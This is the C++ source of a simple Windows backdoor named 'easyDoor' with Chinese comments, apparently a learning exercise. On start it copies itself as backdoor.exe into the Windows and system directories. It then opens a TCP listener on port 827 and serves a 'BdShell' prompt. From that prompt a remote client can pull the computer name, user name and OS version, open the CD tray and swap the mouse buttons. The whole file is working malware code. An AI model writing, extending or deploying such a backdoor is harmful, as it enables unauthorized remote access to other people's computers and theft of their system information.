// easyDoor.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <winsock2.h>
#include <Mmsystem.h>
#include <stdio.h>

#pragma comment (lib, "Winmm")
#pragma comment (lib, "ws2_32")

#define HELPMSG "help - Show Help Menu \r\n" \
                "getsysinfo - Get SysTem Information" \
                "open - Open The CDRom \r\n" \
                "close - Close The CDRom \r\n" \
                "swap - Swap Mouse Button \r\n" \
                "restore - Restore Mouse Button \r\n" \
                "exit - Quit BdShell"

#define NAME_LEN 20

typedef struct _SYS_INFO
{
    OSVERSIONINFO OsVer;            // 保存操作系统信息
    char szComputerName[NAME_LEN];   // 保存计算机名
    char szUserName[NAME_LEN];       // 保存当前登录名
}SYS_INFO, *PSYS_INFO;

void GetSysInfo(PSYS_INFO SysInfo)
{
    unsigned long nSize = MAXBYTE;
    
    SysInfo->OsVer.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
    GetVersionEx(&SysInfo->OsVer);
    GetComputerName(SysInfo->szComputerName, &nSize);
    nSize = MAXBYTE;
    GetUserName(SysInfo->szUserName, &nSize);
}

VOID SetCdaudio(BOOL bOpen)
{
     if ( bOpen )
     {
         // 打开光驱
         mciSendString("set cdaudio door open", NULL, NULL, NULL);
     } 
     else
     {
         // 关闭光驱
         mciSendString("set cdaudio door closed", NULL, NULL, NULL);
     }
}

VOID SetMouseButton(BOOL bSwap)
{
    if ( bSwap)
    {
        // 交换
        SwapMouseButton(TRUE);
    } 
    else
    {
        // 恢复
        SwapMouseButton(FALSE);
    }
}

BOOL Dispatch(SOCKET sock, char *szCmd)
{
    BOOL bRet = FALSE;
    
    // 根据不同的命令，完成不同功能
    if ( !strcmp(szCmd, "help") )
    {
        send(sock, HELPMSG, strlen(HELPMSG) + sizeof(char), 0);
        bRet = TRUE;
    } 
    else if ( !strcmp(szCmd, "getsysinfo"))
    {
        SYS_INFO SysInfo = { 0 };
        GetSysInfo(&SysInfo);
        int n = send(sock, (const char *)&SysInfo, sizeof(SYS_INFO), 0);
        bRet = TRUE;
    }
    else if ( !strcmp(szCmd, "open") )
    {
        SetCdaudio(TRUE);
        bRet = TRUE;
    }
    else if ( !strcmp(szCmd, "close") )
    {
        SetCdaudio(FALSE);
        bRet = TRUE;
    }
    else if ( !strcmp(szCmd, "swap") )
    {
        SetMouseButton(TRUE);
        bRet = TRUE;
    }
    else if ( !strcmp(szCmd, "restore") )
    {
        SetMouseButton(FALSE);
        bRet = TRUE;
    }

    return bRet;
}

void CopySelf()
{
    // 保存自身程序的路径
    char szSelfName[MAX_PATH] = { 0 };
    // 保存Windows目录的路径
    char szWindowsPath[MAX_PATH] = { 0 };
    // 保存系统目录的路径
    char szSystemPath[MAX_PATH] = { 0 };
    // 临时路径变量
    char szTmpPath[MAX_PATH] = { 0 };
    
    GetModuleFileName(NULL, szSelfName, MAX_PATH);
    GetWindowsDirectory(szWindowsPath, MAX_PATH);
    GetSystemDirectory(szSystemPath, MAX_PATH);
    
    strcat(szWindowsPath, "\\backdoor.exe");
    strcat(szSystemPath, "\\backdoor.exe");
    
    CopyFile(szSelfName, szWindowsPath, FALSE);
    CopyFile(szSelfName, szSystemPath, FALSE);
}

int main(int argc, char* argv[])
{
    // 拷贝自身到wnidows目录和系统目录
    CopySelf();
    WSADATA wsaData;

    WSAStartup(MAKEWORD(2, 2), &wsaData);

    SOCKET ServerSock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

    sockaddr_in serveraddr;
    serveraddr.sin_family = PF_INET;
    serveraddr.sin_addr.S_un.S_addr = inet_addr("192.168.189.128");
    serveraddr.sin_port = htons(827);

    bind(ServerSock, (SOCKADDR*)&serveraddr, sizeof(sockaddr_in));

    listen(ServerSock, 1);
    printf("Listen ... \r\n");
    sockaddr_in clientaddr;
    SOCKET clientSock;
    int len = sizeof(sockaddr_in);

    clientSock = accept(ServerSock, (SOCKADDR*)&clientaddr, &len);

    printf("connected host info: \r\n");
    printf("Client ip   : %s \r\n", inet_ntoa(clientaddr.sin_addr));
    printf("Client port : %d \r\n", ntohs(clientaddr.sin_port));

    while ( TRUE )
    {
        // 发送一个命令提示
        send(clientSock,
            "BdShell>",
            strlen("BdShell>") +sizeof(char),
            0);

        char buff[MAXBYTE] = { 0 };
        
        // 接收客户端发来的命令
        recv(clientSock, buff, MAXBYTE, 0);
        if ( !strcmp(buff, "exit") )
        {
            break;
        }

        // 分发命令
        BOOL bRet = Dispatch(clientSock, buff);
        if ( bRet == FALSE )
        {
            send(clientSock,
                "Command Unsuccessfully!",
                strlen("Command Unsuccessfully!") + sizeof(char),
                0);
        } 
    }

    closesocket(clientSock);
    closesocket(ServerSock);

    WSACleanup();
    
	return 0;
}